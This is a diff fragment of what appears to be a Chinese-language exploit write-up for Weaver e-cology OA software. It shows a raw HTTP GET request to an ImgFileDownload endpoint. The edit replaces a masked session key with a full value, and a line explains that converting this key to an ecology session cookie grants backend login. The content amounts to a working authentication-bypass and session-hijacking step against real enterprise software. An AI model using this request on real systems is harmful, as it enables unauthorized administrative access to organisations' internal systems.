@@ -88,7 +88,7 @@ GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.
 将sessionKey转换为ecology_JSessionid即可登录后台  
   
 ```http
-GET /weaver/ImgFileDownload/a.swf?sessionkey=b**********************************4&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
+GET /weaver/ImgFileDownload/a.swf?sessionkey=b20e3665-d8a8-403d-a041-0c5883626da4&a=.swf HTTP/1.1Host: xxxx:xxxxUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1
 ```  
   
 ####   
